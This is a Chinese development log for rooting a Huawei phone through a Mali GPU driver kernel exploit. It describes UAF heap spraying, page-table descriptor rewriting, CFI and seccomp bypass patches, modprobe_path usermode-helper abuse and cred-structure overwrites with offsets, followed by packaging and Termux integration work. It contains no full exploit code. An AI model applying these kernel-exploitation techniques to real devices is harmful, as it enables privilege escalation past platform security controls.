  指标成立。标定判为未通过；设备已切回 `time` 并重启。v0.6 保留信号门作
  实验工具，文档标注「稳定用 time、signal 实验性」。下一步应做门槛二分：
  `time` 模式下 `PROBE_GATE_UP=900/1200` 找最小安全放行时刻。
  回退开关实测可用（广播 → `gate_config: mode=time`）。
- **C-62｜门禁标定的两个工程发现（2026-11-07 12:15）**。
  ① `/data/local/tmp/probe_gate` **文件通道可用**：目录 `drwxrwx--x`、
  文件 `chmod 666` 时 app 域能读，实测 `gate_config: hard_up=900s` 生效
  → **门槛二分不用重编 APK**，写文件 + 重启即可；删文件回默认 1500 s。
  （之前担心 app 域只有 execute 没有 read，是针对「写」文件；这里读是通的。）
  ② `Prefs.MAX_FAILS=2` 的 **bootloop brake 会在连续 2 次 panic 后彻底
  `autostart disabled`**，守护打印 `previous attempt took the device down
  (strike 2/2)` 且不再启动探针。这是 signal 4 连崩的隐性后果：**不是"下轮
  自动重试"，而是整条开机链停摆**。`cmd run --ei delay 0` 才能清 FAILS +
  `GuardService.arm()` + 立即启动；`cmd enable` 只清标志不 arm。
  每轮标定失败后都要先发它，否则下一轮看似"没跑"其实是 brake。
- **C-63｜曾考虑的内核内存信号（2026-11-07，方向记录；结论见 C-65）**。
  读 `jit_write_probe_v16.c` 的 `done:` 分支：`keepalive: L2 descriptors
  live` 之后探针**只做 `for(;;) sleep(3600)`**，所有内核写入（含
  `start_root_channel()` → fork rootd、迁移 top-app cpuset）都在它之前。
  所以 panic 不是探针收尾触发，而是被改写的 L2 页表描述符在后续异步事件里
  崩；它随系统负载变化，且**历史上多个 1500 s 轮次同样止于 keepalive**
  → panic 本身是概率性的，时间只改变概率。
  `MemAvailable` 只反映页缓存；`/proc/meminfo` 里 app 域同样可读的
  **`Slab` / `SReclaimable` / `SUnreclaim` / `KernelStack` / `PageTables`**
  更贴近内核 slab/页表状态，是下一步比「猜时间」更值得采样的信号。
  采集脚本（工作目录、不入包）：`ksu-shim/gatecheck/collect_mem_curve.sh`。
  注意别在标定轮里跑它：adb 采样会引入负载，污染对照。
  另一个操作坑：`cmd run` 遇到已运行探针只回 `already running pid=...`，
  改 `PROBE_GATE_UP` 后**必须重启**才会被读到（见 `USAGE 9.12`）。
- **C-64｜门槛二分收敛：1500 s 是实测下限（2026-11-07 13:58）**。
  在 `time` 模式下用 `/data/local/tmp/probe_gate` 直接改绝对放行时刻：
  390 s **0/4**、900 s **0/2**（911/927 s）、1200 s **0/2**（1228/1229 s）、
  1500 s **2/2**（1527 s，两轮都 `SukiSU layer ready`、bootreason=reboot）。
  即**原 1500 s 门不是盲等**，1200 s 及以下 8 轮全灭；阈值在 1200–1500 s
  之间，但 1350 s 只省 2.5 分钟，不值得再花 22 分钟/轮去试。
  发布包与设备都保持默认 `time` / 1500 s。详见 `RESEARCH_LOG` §28.7。
- **C-65｜slab 曲线否定了所有用户态内存信号（同轮采集）**。
  55 点 `/proc/meminfo`（`probe/mem_curve_20261107.txt`）：`Slab`
  (224–225 MiB)、`SUnreclaim` (151–152)、`KernelStack` (恒 44)、
  `PageTables` (69–70)、`SReclaimable` (恒 73) 在 390/900/1200/1500 s
  **四个时刻几乎完全一致**，且全部在 up=250–402 s 就进入 6 点稳定窗口。
  所以 §26「后 18 分钟系统状态没变化」对**所有**用户态可读内存字段成立，
  1500 s 门等的是内核内部状态（slab 碎片 / 页表描述符回收 / 周期性
  worker），用户态观测不到。**换信号没用；要压缩只能动利用链本身**
  （方案 C：spray 绑核、slot 冗余、缩短 UAF 窗口），风险高、不在本轮范围。

- **C-66｜25 分钟门的真因是 `insmod` 的 CFI，不是内核内存状态（2026-11-07）**。
  改从 `/sys/fs/pstore/console-ramoops-0` 取现场：
  `CFI failure (target: hlk_ksu_shim9_init [hlk_ksu_shim9])`、
  `exception_info [do_one_initcall+0x3ec]`、`etype[6a]` = `VENDOR AP CFI`，
  华为把 gcc 模块的 CFI 校验失败当致命系统错误直接复位。探针 `PHASE_I OK`
  之后根已经拿到，是 APK 自动 `insmod` 把手机带走的。v0.6 phaseK 的
  `cfi_bypass` 文本补丁在 75 个历史引导里回读永远是 `not visible`，
  且 icache 刷新循环被 `if (sig_landed)` 挡住从未为它执行。**§28.8 对
  内核内部条件的三个猜测（slab 碎片 / 页表回收 / 周期 worker）全错**，
  真正等的是一条文本补丁在目标 CPU 上是否生效。
- **C-67｜400 s 还有独立的 UAF 槽位争用**。第 4 轮
  `kbase_jit_free+0x324` 解引用 `dead000000000108`（链表毒值），日志停在
  `sprayed 1024 native regions`；`PROBE_CHAIN_FAST=1` +
  `PROBE_CHAIN_SPRAY=1536` 后越过。与 C-66 互不相关，需同时不发生。
- **C-68｜收尾恢复 GPU 描述符会 panic（方案 C 的否定分支）**。提权后把
  L2/L3 描述符写回，探针在 GPU 作业中途死亡、Mali 上下文被销毁，app 的
  process reaper 在 `release_task+0x44` 解引用被踩坏的 `task_struct`。
  继续沿用 v0.6「泄漏上下文、进程永生」，不要试图优雅收尾。
- **C-69｜8 核 icache 刷新也救不了 CFI**。第 5 轮 `chain5: cfi RET flushed
  on 8/8 cpus`，`insmod` 落在已刷新的 cpu2，仍打印 `CFI failure`。
  说明 `gpu_write32()` 返回 0 不等于物理页被改写，问题在写入本身而不在缓存
  可见性；绑 rootd 也会被 `rootd.sh` 的 `to_topapp` cpuset 迁移覆盖。
- **C-80｜UMH 内核线程是确定性的无 seccomp 通道（2026-11-08）**。
  `request_module()` 通过 `call_usermodehelper()` 执行 `modprobe_path`，
  该线程实测 `uid=0(root) / u:r:kernel:s0 / Seccomp: 0 /
  CapEff 0000007fffffffff`，`insmod` 能返回 `EEXIST` 而非 `Bad system call`。
  触发方式：`socket(未注册族)` 或 `ip link add … type <未知 kind>`；
  `mknod + open` 在本内核无效；**`ip link del` 会额外再触发 2 次 UMH**
  （1 → 3 命中）必须避免。坑：UMH 线程**没有 FBE 会话密钥**，在 `/data`
  新建文件报 `ENOKEY / Required key not available`，只能由有 keyring 的
  bootstrap 预创建文件、helper 只追加。全局 `modprobe_path` 用完必须恢复。
- **C-79｜v1.3 根治 `seccomp_bypass` 补丁偶发未落地（RC=159）**。
  §36.5 的第 3 轮失败不是「回读不准」这么简单：v1.2 把
  `dump_phys_batch()` 回读当判据，并用它**门控全 CPU icache 刷新**；
  而 phaseK 把同一个 L2 槽位 501 在三个 2 MB 块之间反复重指向，GPU
  walker 缓存翻译结果导致重映射后的首写可能落到旧块。v1.3 双层修复：
  ① 探针 `phaseK2` 用 `sc_allowed(104)` 做功能判定、无条件刷 icache、
  失败时换全新槽位 504/505 有界重试；② bootstrap 在 `RC=159` 时借
  `request_module()` 拉起 `Seccomp: 0` 内核线程重跑两个 `insmod`，
  **本次开机即恢复**。两层互不依赖。v1.3 APK `38a428ca…`（code=13）、
  探针 `7a86966f…`。**4 轮 400 s 门开机 root + 双模块 4/4**
  （v1.2 为 3/4）、JIT_FREE 4/4、零 `RC=159`；第 1/2 轮回读
  `not visible` 且功能判定 0，被新槽位 504 重试救回。第 3 轮证明
  `sc_allowed()` 的 150 ms poll 会假阴性（判 FAILED 但 insmod 成功），
  故真实判据只看 `INSMOD-RC` / `UMH-*`。详见 `RESEARCH_LOG` §37、
  `probe/v13/README.md`。
- **C-78｜v1.2 问题二根治（JIT_FREE UAF）**。读 Mali r19p0 源码定位：
  `kbase_jit_backing_lost()` → `schedule_work()` → destroy worker 在
  **任意 CPU** `kfree(reg)`；SLUB per-CPU freelist 与 v1.1 的单核 spray
  错配 → 悬垂 `kctx->jit_alloc[id]` 的 slot 没被我们复用 →
  `kbase_jit_free()` 的 `list_add/list_move` 踩 LIST_POISON
  (`dead000000000108`) panic。修复：worker 同步（MEM_QUERY 变 EINVAL
  作为 rb_erase 完成信号）+ 全 CPU 抢占 spray（32×N cpus）+
  `PROBE_JIT_SYNC=2` fail-closed。v1.2 APK `1dffb139…`（code=12）、
  探针 `dcb302fb…`。**4 轮 400 s 门开机 JIT_FREE 4/4 通过**（§35 约
  5/10），3 轮完整 root。第 3 轮暴露独立的 `seccomp_bypass` 补丁
  未落地 → insmod SIGSYS RC=159，留待下阶段。详见 `RESEARCH_LOG` §36（v1.2 生成脚本与备份已随 2026-11-11 目录清理移除）。
- **C-77｜v1.1 rc=0 静默死亡根因 + fast 回退**。恢复出厂后 panic 打断
  PM 解包 → 解出的 lib 内容损坏（尺寸对、内容 NUL），而这台 EMUI exec
  垃圾字节 rc=0 零输出 → 探针秒退。GuardService 改为 ELF 魔数校验 +
  从 base.apk 重新解出。另：drain 后停滞与 fast/spray 无关（11 轮统计），
  为 DONT_NEED 异步 jit_free 与 phaseD 首提交的竞态，成功率约 5/10，
  靠自动重试兜底；fast/spray 默认回退 v0.8 组合。APK `fcabbdc9…`（code=11）。
- **C-76｜v1.0 APP 日志区 UI 修复**。原布局 weight=1 在实机上被
  上方固定内容挤成负空间，日志塌缩不可读；改为整页 ScrollView +
  日志固定 280 dp 独立滚动 + 贴底自动跟随。APK `8d54d933…`（code=10），
  利用链零改动。
- **C-75｜v0.9 UAF 加固默认开**。chain5 的 fast=1（消除 shrinker
  kfree→spray 竞态窗口）+ spray=1536 并入正式探针；v0.8 期间 400 s 门
  连续两轮 UAF panic，v0.9 首轮即稳（`PHASE_I OK` @396、无 panic）。
  开关 `probe_chain_fast/spray`，设 0 回退。APK `eac59edd…`（code=9）。
- **C-74｜v0.8 出厂默认 400 s / time**。探针 `probe_gate_up` 默认 1500→400、
  `probe_gate_mode` 与 GuardService 默认 signal→time；APK `2ff32ed1…`（code=8）。
  恢复出厂实测：首轮 1/6 概率撞 JIT_FREE UAF 复位，次轮自动重试成功——
  恢复出厂→装 APK→两次开机内必得 root，全程无人值守。
- **C-72｜CFI 根治：模块内嵌页对齐空 `__cfi_check`（v0.7）**。读
  `kernel/cfi.c`/`module.c`/`cfi_harden.c` 确认：加载器对每个模块无条件按名
  注册 `__cfi_check` 进 CFI shadow，gcc 模块缺符号 → shadow 未命中 →
  `VENDOR_EXCEPTION(AP_S_CFI)` 复位。给两个模块加空 `__cfi_check`
  （`aligned(4096)`，shadow 登记 BUG_ON 要求页对齐）后，insmod 与全部
  跨模块调用确定性通过，**25 分钟门根治**；400 s 早放行一次通过
  （`PHASE_I OK` @396 s、`INSMOD-RC=0`、`SukiSU layer ready`、`su` 可用）。
  v0.7 APK `5d4cb163…`；探针内置默认仍 1500 s 作兜底。
- **C-71｜基线 1500 s 也只是概率性成功（回退复验）**。完整回退 v0.6
  (`515706d2…`)、删 `probe_gate`/`probe_chain_*`、`cmd gate time` +
  `cmd enable` 后按默认门跑：`PHASE_I OK` → `keepalive` →
  `CFI failure (target: hlk_ksu_shim9_init)` on cpu6 → `reboot,abnormal`
  (`probe/chain-exp/ramoops_baseline_1500s.txt`)。**1500 s 从未保证成功，
  只是把 insmod 落到 cfi 补丁可见 CPU 的概率抬高**；§28.7 的 2/2 是小样本，
  §28.5 的「多个 1500 s 轮次也止于 keepalive」由此解释。继续二分门槛无意义。
- **C-70｜5 轮 400 s 早放行 0 成功，发布包与设备均回退 v0.6**。
  实验留档 `probe/chain-exp/`（源码 / 逐级补丁 / 两份完整 ramoops /
  `CRASH_EVIDENCE.md`）；工作树 `backup/chain-20261107-142106/` +
  `probe/chain2/rollback.sh` 可一键回退。APK 仍是
  `fcabbdc9d99b741129380e367148416b`，`time` / 1500 s。下一步若要继续，
  只能改 CFI 校验链本身或去掉 UAF 对开机时序的依赖。


---


---

## 补充（2026-11-09）：C-82…C-84 —— root 会话完整性与 ENOKEY 根治

本节记录让「临时 root 真正可用」的两处修复。完整过程见
`docs/RESEARCH_LOG.md` §39，重启后验收输出见研究目录
`research/evidence/verify_fix_20261109.txt`。

- **C-82｜【定论】ENOKEY 的根因是 `prepare_kernel_cred()` 清空 keyring**。
  从 VM 的 `kernel/cred.c` 读到：该函数**无论传不传 `daemon` 都把四个
  keyring 指针全部置 NULL**，它返回的是一份干净的内核 cred，不是当前
  cred 的副本。shim9 的 `GRANT_ROOT` 用 `g_pkc(NULL) + commit_creds()`，
  于是 root 会话 uid 0、全 caps，却丢了 FBE 会话密钥：在 `/data` 下能读、
  能追加已有文件、能建**一层**目录，但 `touch` 新文件、建第二层目录一律
  `Required key not available`；列 app 私有目录看到的是 **FBE 密文文件名**，
  `md5sum` 也报 ENOKEY。C-12 / C-14 时代反复出现的这个现象，到这里才
  定位到 cred 构造方式本身（C-14 定论的 kernel SID 是另一条独立路径）。
  修法：改用 `prepare_creds()`，它 `key_get()` 全部 keyring、经
  `security_prepare_creds()` 复制 LSM blob；之后只覆写 `0x04..0x24`
  （8 个 uid/gid 归零）和 `0x28..0x48`（caps 置 `7fffffffff`），
  `0x50` 起的 keyring / security / user_ns / group_info 原样保留。
  偏移取自 v16 从 `kimage.bin` 的 `init_cred` 实测；加了运行时布局自检
  （uid 偏移不符即安全回退）与 `prepare_creds` 缺失时降级到旧路径。
  HKIP 下 `commit_creds()` 会把 cred 复制进只读 prmem 页，所以**在 commit
  之前改写正是正确时机**；`hkip_check_xid_root()` 在 HKIP=y 时不执行。
  `/proc/hlksu_fd9` 新增 `fbe_keyring: … mode=preserved` 供验收。

- **C-83｜改 `prepare_creds()` 后的 capability 回归，用 ambient 修复**。
  第一次重启后 ENOKEY 消失，但 `CapPrm/CapEff` 变成 0，需要特权的命令
  报 EPERM。`caps_probe.c`（不 exec）证明提权后 `CapInh/Prm/Eff/Bnd`
  全是 `7fffffffff`，丢失发生在 `execve` 的 `cap_bprm_set_creds()` 重算
  （调用者 shell 原本 `CapBnd` 只有 `0xc0`）。`caps_probe2.c` 验证 exec 前
  `PR_CAP_AMBIENT_RAISE` 全部 37 个 cap 可保住：exec 后
  `CapEff=1fffffffff`。于是把 `keep_caps_across_exec()` 加进 `hlk_su.c`
  （GRANT_ROOT 之后、`execv` 之前），纯用户态改动、模块无需再改。

- **C-84｜重启后验收与 2026-11-09 收尾整理**。
  `KsuBootstrap.extract()` 每次开机无条件从 APK assets 覆盖
  `files/ksu/`，所以只 push 新 `.ko` / `hlk_su` 会在重启后失效 ——
  按 `reboot → install → reboot → 400 s 门` 标准流程部署后（共两次重启，
  模块是 `[permanent]`），重启态实测：
  `fbe_keyring: mode=preserved`、`CapPrm/CapEff=1fffffffff`、
  `Seccomp: 0`、`grants=N fails=0`；深层 mkdir / 新建文件 / 写入 / 回读
  全部 `rc=0`；app 私有目录从 **FBE 密文文件名**恢复为正常文件名，
  `md5sum` 不再 ENOKEY；探针与双模块全程完好。
- **C-85｜【定论】全新出厂场景下的 su 可用性由开机链保证**。
  §39 的修复都落在当前机器；恢复出厂后有三样东西必然回到初始态：
  ① shim9 的 allowlist 是模块内存、Manager 无持久化（重启即空表）；
  ② `com.termux` 的 uid 由安装顺序决定，不能硬编码；
  ③ Termux 自带占位 `su`，`tsu` 又只找 `/system/{x,}bin/su`，而
  `hlk_sucompat.ko` 的 execve 改写是概率性的、且只伪造 `stat` 不伪造 `open`。
  另外还有时序问题：开机链在 400 s 门后完成，Termux 可能晚装、或首次启动
  才解压 bootstrap。
  解法是**把适配做成 APK 的一部分**：新增 4 个 assets（真实 `termux_su`
  前端、仅改 `SU_BINARY_SEARCH` 的 `termux_tsu`、`SET_APP_PROFILE` 工具
  `grant_su`、幂等脚本 `hlk_termux_setup.sh`），由
  `KsuBootstrap.startTermuxWatch()` 在模块加载后起 daemon 线程，用
  PackageManager **运行时**查 uid，成功前每 5 s 轮询、成功后每 60 s 自愈
  （marker 消失即重打，`pkg upgrade` 也能恢复）。`sudo` 直接链到真实 su，
  覆盖 `sudo su -c`（tsu 该分支会挂起）。整条链不经过内核重写。
  **重启态验收**：把 Termux 三个文件还原成原版后再走两次重启，logcat
  `assets 11/11` → `INSMOD-RC=0` → **1.5 s 后** `Termux su ready (uid=10161)`
  → `SukiSU layer ready`；空 allowlist 自动补为 1，三个文件自动带 marker；
  70/70 提权成功且 `/proc/hlk_sucompat` 的 `hits/hits_stat/fault_out`
  **全程为 0**；mkdir/cp/mount/umount 全 `rc=0`。tmoe 的
  `tmoe-linux-container` 随后由 tmoe 自身生成，无需手工补。
  APK `c4ba1beb…`（当时值，现行见 C-87）；机制与日志见 `docs/RESEARCH_LOG.md` §40。


- **C-86｜【定论·纠错】`CONFIG_NAMESPACES is not set` 没有关闭 mount
  namespace，也不能靠内核模块补**。此前 §39 / §40 把该项写成「编译期硬限制、
  挂载全局可见、只能单实例、`unshare(CLONE_NEWNS)` 静默成功但不隔离」是
  判错了：① `init/Kconfig:1027` 的 `menuconfig NAMESPACES` 只是 bool
  菜单门控，`if NAMESPACES ... endif` 内只有 UTS / IPC / USER / PID / NET
  五个 bool 子项，**内核没有 `CONFIG_MNT_NS`**；`kernel/Makefile:11` 的
  `nsproxy.o` 与 `fs/Makefile:12` 的 `namespace.o` 都在无条件 `obj-y`。
  ② `copy_namespaces()` / `unshare_nsproxy_namespaces()` 显式处理
  `CLONE_NEWNS`，唯一门槛 `ns_capable(CAP_SYS_ADMIN)`；
  `fs/proc/namespaces.c:32` 的 `&mntns_operations` 无 `#ifdef`。
  ③ 真机 `/proc/self/ns/` 有 `mnt` 与 `cgroup`、无其余五个；kallsyms 中
  `create_new_namespaces` / `alloc_mnt_ns` 是完整函数，那些相隔 4 字节的
  符号是 **CFI 跳转表 `b <真身>`** 而非空桩（此前误判来源）。

  **真机实测**（探针源码 `research/evidence/mntns_probe.c`、`mntns_multi.c`）：
  `unshare(CLONE_NEWNS)` 后子 ns id 由 `mnt:[4026532835]` 变为
  `mnt:[4026533185]`；配 `MS_PRIVATE|MS_REC` 时父 ns 全程看不到子挂载、
  退出零残留；**不配**则父 ns `during=1 / after=1`，即 shared 传播把挂载
  漏回系统 ns 并残留。并行两实例 id `4026533185` / `4026533196` 各自只看
  到自己的挂载、父 ns 看不到任何一个 → 隔离与多实例均成立。
  正确用法：`unshare -m` 后必须 `mount --make-rprivate /`（或 `mount(2)`
  的 `MS_PRIVATE|MS_REC`）。

  **不能做成 `.ko`**：五个子项都是 `bool` 而非 `tristate`、相关 `.o` 在
  `obj-y`；namespace 字段长在 `struct task_struct` / `struct nsproxy`、
  创建路径在 `fork() → copy_process()`、暴露靠 procfs，属编译期结构布局，
  模块无法补字段或替换被裁掉的代码；重编整个 kernel + 换 boot.img 又被
  BL 锁 + AVB / HKIP / CFI 校验挡住。详见 §41。


- **C-87｜`su -c` 中 Android 系统工具不可见的根因是 PATH，不是权限**。
  Termux 进程实测 `PATH=/data/data/com.termux/files/usr/bin`（仅
  `$PREFIX/bin`），而 `$PREFIX/bin/mount` / `umount` / `toybox` 全部缺失，
  `mkdir` / `chroot` 却是 coreutils 链接——这解释了"同一批 `su -c` 里
  mkdir 成功、mount 连续 6 次 `inaccessible or not found`"。`hlk_su` 以
  绝对路径 `execv("/system/bin/sh")` 且原样继承 environ，所以那个 sh 的
  PATH 仍是 Termux 的。模拟该 PATH 直接跑 `hlk_su -c "mount --help"` 得到
  逐字相同的报错，**决定性复现**。后续 `/dev/null: 权限不够` 是连带后果：
  挂载步骤全失败 → `/dev` 未 bind → rootfs 里的 `/dev/null` 只是 0600
  普通文件（实测）。修法全在用户态：① `termux_su` 在 exec 前把
  `/system/bin` 等系统路径**追加**到 PATH（`$PREFIX/bin` 保持最前）；
  ② `hlk_termux_setup.sh` 的补丁判定由固定 marker 改为 `cmp -s` 内容比对，
  否则 marker 不变时开机链会跳过新 assets，恢复出厂仍会带回旧前端。
  **真机验证**：模拟 Termux PATH 下 `mount`/`umount` 均解析到 `/system/bin/`、
  `MOUNT_RC=0`、`sudo su -c` 形式正常；setup 从旧版自动升级且二次运行幂等；
  受控挂载链（bind /dev、proc、sysfs、devpts、tmpfs）全 `rc=0`，`/dev/null`
  变 `crw-rw-rw-` 且 chroot 内可写；整个验证在隔离 mnt ns 中完成，系统
  挂载表零残留。APK `fa8247a3…`（当时值；§43 起 `5a2aab93…`、§45 起 `4bf639d0…`、§46 起 `b448b475…`、§47 起 `f6b781dc…`、§47.7 起 `3707b66a…`），
  核心 `.ko` / `hlk_su` 未变。见 §42。

- **C-88｜内置 Manager APK 可以从主包中完全剔除（20.2 MB → 3.7 MB）**。
  旧签名 APK 共 22 个条目，`assets/ksu/ksu_manager.apk` 未压缩
  17,173,205 B、压缩后 16,447,476 B，占 20,231,620 B 安装包的 81.3%，
  是唯一的大文件。它的职责链：`ksu_bootstrap.sh` 在 kernel 域预置到
  `/data/local/tmp/`（setcon 后读不到 `app_data_file`）→
  `KsuBootstrap.launchInstaller()` 用 `setsid timeout 90 ... &` 跑
  `ksu_install_mgr.sh` → `pm install -r -d` + uiautomator 自动点华为两级
  确认框 → 主循环最多轮询 10 分钟等 `com.sukisu.ultra` → `writeUid()`
  写 `/proc/hlksu_fd9` 并 force-stop 重连。

  **判定 root 不依赖 Manager**：垫片 `GRANT_ROOT` 的鉴权是
  `uid==0 || uid==2000 || uid==g_mgr_uid || allow_has_su(uid)`；root 通道与
  `hlk_su` 都是 uid 0，`grant_su` 的 `SET_APP_PROFILE` 也由 root 调用，
  Termux 的 `su` / `sudo` / `tsu` 走真实 `$PREFIX/bin/su` + `grant_su` 重建
  allowlist，全程不需要 Manager 进程。`g_mgr_uid` 只影响 Manager UI 自己
  发 supercall 的鉴权与 fd 注入。所以把这份 APK 拿出来**单独安装**是安全的，
  但必须保留"装后把 uid 告知垫片"，且原 10 分钟轮询对"开机链结束后很久
  才装"不够用。

  **改动**（全在打包层 / 用户态，`.ko` 与 `hlk_su` 一个字节未动）：
  ① 两份 `build.sh` 移除 `ksu_manager.apk` / `ksu_install_mgr.sh`，ksu
  assets 11 → 9；② `KsuBootstrap.java`（两份副本同步）ASSETS 11 → 9、
  删 `launchInstaller()`、新增 `startManagerWatch()`（daemon 未命中 10 s
  轮询 / 命中后 60 s 复查，uid 变化自动重写并 force-stop，日志
  `Manager linked (uid=…)`），主 `run()` 不再因缺 Manager 阻塞，模块加载完
  即 `SukiSU layer ready`；③ 新增 `pruneStaleAssets()` 清掉旧版解压在
  `files/ksu/` 的 17 MB 残留，避免"包瘦了、数据没瘦"；④ 两份
  `ksu_bootstrap.sh` 删掉 kernel 域 stage Manager 的分支。

  **结果**：新签名 APK 3,786,033 B（-16,445,587 B / -81.3%），md5
  `5a2aab9397c37ad55ad16b71724f7665`；apksigner 显示新旧证书 SHA-256 同为
  `cf77fbf1…0b62a5`，可直接 `adb install -r -d` 覆盖、无需卸载。Manager
  版本仍锁 40994 / UAPI 5；旧版留在 `/data/local/tmp/ksu_manager.apk`
  的副本需手动删除。真机覆盖安装与开机链复验见 §43。

- **C-90｜tmoe `MOUNT_TMP` 设置失败的根因是 `su -c` 参数拼接丢引号**。
  用户在 tmoe「环境变量 / 挂载管理」里绑 Termux tmp 到容器 `/tmp`，
  界面显示 `status false / source dir 空`，进容器报
  `cp|chmod: dangling symlink`、`grep: Permission denied`、
  `/system/bin/sh: syntax error: unexpected '('`。真机逐项查证：
  `TMOE_PREFIX=sudo`，配置写入是**多 argv 词**的
  `sudo sed -i -E "s@^(MOUNT_TMP=).*@\1true@" <startup>`；我们的
  `termux_su` 用 `cmd="$*"` 拼平参数、`hlk_su` 再交给 `/system/bin/sh -c`，
  sed 捕获组里的 `(` 因此裸露 → 语法错误、**配置根本没写进去**。
  决定性复现：多参数形式 RC=1 报同样错误，整体加引号的单参数形式
  RC=0 且写入成功。另一个独立问题：配置界面以 Termux 用户 `grep`
  `usr/local/etc/tmoe-linux/container/tmoe-linux-container`，而父目录
  `usr/local/etc/tmoe-linux/` 是 `0700 root` → `Permission denied` →
  界面显示假默认值。`profile.d/*` 的绝对软链在 chroot 外必然悬空，
  `cp/chmod` 警告是非致命的。

  **修法**（只动用户态）：① `src/sukisu/termux_su` 新增 `requote()` /
  `build_cmd()`，参数 >1 时逐个单引号包裹再拼接，单参数原样透传；
  ② `src/sukisu/hlk_termux_setup.sh` 幂等放开该目录到 0755、缺 `tsudo`
  时补链接；③ 设备上把两个绝对软链改成 `../../usr/local/etc/...`
  相对软链（当时未固化，§46 已并入开机链自愈）。`.ko` / `hlk_su` / 探针一字未动。

  **验证**：热替换回归 A–F 全绿；重编 APK `4bf639d0…` 后
  `reboot → install → reboot → 400 s 门` 全量部署：
  `assets 9/9` → `INSMOD-RC=0` → `Termux su ready (uid=10161)`，
  `su` md5 `cdf7740c…`、目录 755、`tsudo` 就位；
  `sudo sed` / `sudo grep` / `cp` 到 profile 链接全部 RC=0。

  **边界**：仍**不建议开启 MOUNT_TMP** —— Termux `$TMPDIR` 是
  `0700 u0_a161`，bind 会把 0700 带进容器并遮住 rootfs `/tmp` 里
  `.tmoe_container_temporary/` / `hostname` / `resolv.conf`；容器自带
  `/tmp` 是 1777，够用。共享文件用默认已开的 `MOUNT_TERMUX`。
  详见 `docs/RESEARCH_LOG.md` §45、`docs/USAGE.md` §5.4。


- **C-91｜所有 Termux / tmoe 补丁已随 APK 自动生效；开机链最长约 15 分钟**。
  §45 遗留的 profile.d 绝对软链修复原本只在真机手工做过，现已并入
  `src/sukisu/hlk_termux_setup.sh`（改相对软链、幂等、由 60 s watchdog
  覆盖开机后才部署的容器）。APK `b448b475b06a274c31c6eb302b34c8e7`，
  9 个 ksu assets，`.ko` / `hlk_su` / 探针未动。**真机端到端**：故意把
  软链改回绝对 → 两次重启 → `SELF_HEALED=1`、755 / `tsudo` / 链接可读
  全绿；再模拟 `pkg upgrade` 删 `su` + 重建容器 → 75 s 内 `su` md5
  `cdf7740c…` 与软链全部自愈，`sudo sed` RC=0。**代码核对**：没装
  Termux 时 watchdog 无限 5 s 轮询、无超时；`Prefs.ENABLED` 默认 false，
  全新安装必须打开一次 APP 点 `Start now`；EMUI 丢 `BOOT_COMPLETED` 时
  靠 15 min 周期 Job，实测开机后约 14 分钟才 ready（不是 6.8 分钟）。
  **禁止 `am force-stop` 本应用**（连带探针 → 内核 panic）。
  见 §46、`docs/USAGE.md` §2.1 / §5.4、README 自动修复清单。


- **C-92｜v1.4 三页 UI + 「补丁」页：Termux 补丁改为完全手动，零常驻线程**。
  用户要求把 §45/§46 的修复集中到一个「Termux 补丁」项目，而不是常驻进程
  监控；UI 仿 KernelSU：主页状态卡四态大标题（探针等待中 / 探针已运行 /
  正在装载内核模块 / ROOT运行中）、底部导航「主页」「补丁」「日志」、无黑色
  ActionBar。「什么时候需要点一次」合并进同一张卡片。代码：新增
  `Ui.java` / `HomePage.java` / `PatchPage.java` / `LogPage.java`，
  `MainActivity` 重写为三页容器；`KsuBootstrap` 删除两个 watchdog，
  开机链**不再碰 Termux**，新增 `applyTermuxPatch()` / `checkTermuxPatch()`
  与 `channelReady()`（用 `/proc/hlksu_fd9` 而非进程静态 sRoot）；
  `CtlReceiver --es cmd patch|patchcheck`；setup 脚本加只读 `check` 子命令。
  Manager 改为开机一次 + 打开 APP 一次。APK `f6b781dc…` / versionCode 14，
  9 assets，`.ko` / `hlk_su` 未动。**真机两轮验证**：先把 su 还原成原版
  再走完整开机链，链后仍是原版、无 watchdog 线程、无自动补丁日志；点
  一次补丁后 su/sudo/tsudo/755/软链/`sudo sed` 全绿；`patchcheck` 修复
  rootfs 自带绝对软链误报后返回 `PATCH_CHECK_OK`。见 §47.6、
  `docs/USAGE.md` §5.3、包根 README 的补丁表。


- **C-93｜日志页「清空输出」清错对象 + 日志框滚不动，均已修复**。根因三条：
  ① 日志卡片里的按钮笔误绑到 `cmdOut`，且日志来自 `GuardService` 环形缓冲
  （清 TextView 会被每秒刷新覆盖）；② 嵌套 ScrollView 默认 nested
  scrolling 把框内手势先交给整页消费；③ `Ui.mono()` 让 TextView 可聚焦，
  每秒全量 `setText` 反复 `bringIntoView()` 抢走滚动。修法：`clearLog()`
  清缓冲并返回行数、两区域各一个独立清空按钮 +「最新」、内层关 nested
  scrolling 并 `requestDisallowInterceptTouchEvent`、TextView 非聚焦、
  `lastLog` 变化检测避免每秒重排。真机验证：框内/框外滚动各自独立、
  点「清空日志」清 82 行而命令框不变、点「清空输出」反之、清空后新日志
  继续显示。APK `3707b66a…`（code 14），9 assets，核心二进制未动。
  见 §47.7、`docs/USAGE.md` §5.5、证据 `research/evidence/logfix_20261110_*.png`。


- **C-94｜探针不可终止（研究结论，未改动）**。用户问"拿到 SukiSU root 后
  能否停探针省内存"。结论：**不能**。root 归属确实独立（`hlk_su` 走
  `[ksu_driver]` fd + `GRANT_ROOT`，模块内存 allowlist，实测 uid=0 不经
  inbox），但 phase C/E 写入的 foreign L2 描述符无法证明还原（CPU/GPU 缓存
  不一致），进程退出 → kbase context teardown → 释放任意物理页 →
  `PANIC_ON_OOPS=y` 重启（§7.3 / §11.10 / §23.4 实证），重启即清空全部
  临时 root。内存账：`ps` RSS 109 MB 中 RssAnon 仅 240 kB，2085 个
  `/dev/mali0` 映射贡献了全部 RssFile；`dumpsys meminfo` **Pss 仅 4.9 MB**，
  MemAvailable 3.5 GB——杀探针收益 <5 MB。可选方向（还原 L2 后退出 /
  探针瘦身 / fd 托管 / 优化 APP 自身）均未实施。见 §48、
  `docs/USAGE.md` §2.1 红线、`research/evidence/probe_mem_probe.sh`。
